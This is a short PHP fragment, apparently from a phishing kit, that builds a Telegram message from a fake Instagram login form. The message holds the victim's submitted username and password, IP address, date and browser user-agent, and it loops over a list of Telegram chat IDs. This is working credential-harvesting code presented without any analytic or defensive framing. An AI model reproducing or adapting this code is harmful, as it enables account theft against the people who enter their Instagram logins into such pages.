...
if(isset($_POST['okbb'])){
 foreach($IdTelegram as $chatId) {
    ...
    $message = "[+]━━━━━━❤️‍🔥2ND Instagram Login❤️‍🔥━━━━━━[+]\n[👤 Login] : ".$_POST['username']."\n[🔓 Password] : ".$_POST['password']."\n      [+]━━━━【💻 System】━━━[+]\n[🔍 IP INFO] : ".$ip."\n[⏰ TIME/DATE] : ".$date."\n[🌐 User-Agent] : ".$_SERVER['HTTP_USER_AGENT'];
